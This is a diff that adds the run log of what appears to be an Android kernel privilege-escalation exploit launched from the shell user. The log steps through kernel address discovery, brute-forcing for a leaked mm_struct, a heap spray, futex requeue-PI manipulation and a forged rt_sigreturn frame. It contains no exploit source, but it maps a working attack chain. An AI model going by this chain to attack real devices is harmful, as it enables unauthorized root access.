@@ -1,0 +1,88 @@
+===== preload.so crash-safe log =====
+path=/storage/emulated/0/Download/.temp/log_1788946337.txt pid=14858 uid=2000
+1788946337.309 14858 [+] preload starting pid=14858
+1788946337.310 14858 [+] startup context pid=14858 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+1788946337.312 14858 [+] build config pid=14858 label=pd2238_os6_163150_w10 slide=pselect main=pselect
+1788946337.315 14858 [+] p0 profile pid=14858 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
+1788946337.316 14858 [+] direct-map base=ffffff8040000000 slide=0000000000000000
+1788946337.318 14858 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=6af03a13-5039-4c47-b5ad-20332cae635a (odd attempts: leaked page scratch, even attempts: this alias)
+1788946339.452 14858 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+1788946341.885 14858 [*] pile-up verified: approx_time=1734
+1788946341.887 14858 [*] start finding collisisons
+1788946341.889 14858 [*] target    000000727fe0c0c8
+1788946342.090 14858 [*]   000000546c0e7738
+1788946342.417 14858 [*]   000000546c376bb0
+1788946343.543 14858 [*]   000000546d064320
+1788946345.726 14858 [*]   000000546e97fbf8
+1788946346.638 14858 [*]   000000546f4a1508
+1788946347.570 14858 [*]   00000054700b0580
+1788946347.911 14858 [*]   00000054703a8d40
+1788946348.661 14858 [*]   0000005470cbd5e8
+1788946348.878 14858 [*]   0000005470dcae50
+1788946349.141 14858 [*]   0000005470f8fc78
+1788946349.381 14858 [*]   00000054710ee770
+1788946349.599 14858 [*]   000000547120e070
+1788946350.171 14858 [*]   0000005471880400
+1788946350.977 14858 [*]   00000054722994c8
+1788946351.146 14858 [*]   00000054722d86c0
+1788946351.150 14858 [*] found 15 collisisons
+1788946362.992 14858 [*] start bruteforcing
+1788946362.997 14858 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+1788946362.998 14858 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+1788946362.999 14858 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+1788946362.998 14858 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+1788946362.998 14858 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+1788946363.004 14858 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
+1788946362.998 14858 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+1788946362.998 14858 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+1788946362.999 14858 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+1788946363.002 14858 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
+1788946363.002 14858 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
+1788946363.008 14858 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
+1788946363.008 14858 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
+1788946363.010 14858 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
+1788946363.010 14858 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
+1788946363.011 14858 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
+1788946363.013 14858 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
+1788946363.013 14858 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
+1788946363.013 14858 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
+1788946363.013 14858 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
+1788946363.016 14858 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
+1788946363.017 14858 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
+1788946363.017 14858 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
+1788946363.014 14858 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
+1788946363.018 14858 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
+1788946363.018 14858 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
+1788946363.019 14858 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
+1788946363.019 14858 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
+1788946363.021 14858 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
+1788946363.020 14858 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
+1788946363.023 14858 [*] [  0] thread done, tested 481517 candidates
+1788946363.022 14858 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
+1788946363.023 14858 [*] [  7] thread done, tested 500000 candidates
+1788946363.023 14858 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
+1788946363.023 14858 [*] [  2] thread done, tested 199598 candidates
+1788946363.024 14858 [*] [  3] thread done, tested 500000 candidates
+1788946363.023 14858 [*] [  4] thread done, tested 233147 candidates
+1788946363.023 14858 [*] [  1] thread done, tested 202393 candidates
+1788946363.023 14858 [*] [  5] thread done, tested 140990 candidates
+1788946363.023 14858 [*] [  6] thread done, tested 400000 candidates
+1788946363.030 14858 [*] prepare_kernel_page leaked_mm=ffffff801aded280 base=ffffff801ade8000 mode=0
+1788946363.032 14858 [*] fake payload mode=0 write_shape=0 lock=ffffff801ade84d0 w0=ffffff801ade93a0 task=ffffff801adea380 write_parent=ffffff801ade8180 write_right=0000000000000000 write_left=ffffff801adea180
+1788946363.043 14858 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
+1788946363.048 14858 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
+1788946363.049 14858 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
+1788946363.051 14858 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
+1788946363.054 14858 [*] done
+1788946367.503 14858 [+] heap_spray: page_base=ffffff801ade8000 (leaked mm_struct)
+1788946367.508 14858 [+] ckpt: route enter
+1788946367.511 14858 [+] ckpt: route threads spawned
+1788946367.515 14858 [+] ckpt: route ready waiter_waiting=1 owner_started=1
+1788946367.616 14858 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
+1788946375.514 14858 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=20506 sigalrm=0 setprio=0/0
+1788946375.515 14858 [+] ckpt: do_sigret enter page=ffffff801ade8000 lock=ffffff801ade84d0 fops=ffffff801ade8180
+1788946375.516 14858 [+] ckpt: sigret attempt=1 page=ffffff801ade8000 lock=ffffff801ade84d0 tree_pc=ffffff801ade8180 tree_left=ffffff801adea180 task=ffffff8042aec240
+1788946375.517 14858 [+] ckpt: prctl tree-paint ret=-1 errno=22 (EINVAL after copy is OK)
+1788946375.519 14858 [+] ckpt: sigframe sf=0x727e444db0 size=0x1250 reserved=0x727e445000 align16=1 pc=0x727e513008 cont_sp=0000006fe5cf8a20
+1788946375.519 14858 [+] ckpt: firing rt_sigreturn pc=0x727e513008 sp=0000006fe5cf8a20 frame=0x727e444db0
+1788946375.520 14858 [+] ckpt: sigret hold attempt=1 target=ffffff801adea180 proof=scratch(leaked)
